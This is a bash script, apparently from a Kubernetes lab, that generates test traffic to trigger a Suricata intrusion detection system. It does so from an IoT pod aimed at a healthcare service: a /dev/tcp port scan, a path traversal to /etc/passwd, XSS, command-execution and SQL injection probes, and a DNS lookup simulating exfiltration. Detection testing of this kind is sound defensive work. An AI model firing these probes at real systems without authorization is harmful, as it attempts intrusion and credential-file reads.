#!/bin/bash

echo "🌐 Generating Network IDS Events..."

# Get service IPs for testing
HEALTHCARE_IP=$(kubectl get svc -n smart-city healthcare-api-service -o jsonpath='{.spec.clusterIP}')
IOT_IP=$(kubectl get svc -n smart-city iot-device-service -o jsonpath='{.spec.clusterIP}')

echo "Target IPs - Healthcare: $HEALTHCARE_IP, IoT: $IOT_IP"
echo ""

# Use a pod to simulate network attacks
ATTACK_POD=$(kubectl get pods -n smart-city -l app=iot-device -o jsonpath='{.items[0].metadata.name}')

# 1. PORT SCAN DETECTION
echo "1. 🔍 Port Scan Detection"
kubectl exec -n smart-city $ATTACK_POD -c iot-sensor -- sh -c '
for port in 22 80 443 8080 9000; do
    timeout 1 bash -c "echo > /dev/tcp/$1/$port" 2>/dev/null && echo "Port $port open" || true
done
' -- $HEALTHCARE_IP
echo ""

# 2. HTTP ATTACK VECTORS
echo "2. 🕸️ HTTP Attack Vectors"
kubectl exec -n smart-city $ATTACK_POD -c iot-sensor -- sh -c '
curl -s "http://$1/../../../etc/passwd" > /dev/null
curl -s "http://$1/<script>alert(1)</script>" > /dev/null  
curl -s "http://$1/exec?cmd=whoami" > /dev/null
echo "HTTP attack patterns sent"
' -- $HEALTHCARE_IP
echo ""

# 3. SQL INJECTION ATTEMPTS
echo "3. 🗃️ SQL Injection Attempts" 
kubectl exec -n smart-city $ATTACK_POD -c iot-sensor -- sh -c '
curl -s "http://$1/users?id=1 OR 1=1" > /dev/null
curl -s "http://$1/login?user=admin&pass=anything OR 1=1" > /dev/null
echo "SQL injection attempts sent"
' -- $HEALTHCARE_IP
echo ""

# 4. DNS EXFILTRATION SIMULATION
echo "4. 📡 DNS Exfiltration Simulation"
kubectl exec -n smart-city $ATTACK_POD -c iot-sensor -- sh -c '
nslookup google.com > /dev/null
nslookup malicious-domain.com > /dev/null 2>&1
echo "DNS queries made"
'
echo ""

echo "✅ Network attack simulations completed!"
echo "Check Suricata logs: kubectl logs -n monitoring -l app=suricata --tail=10"

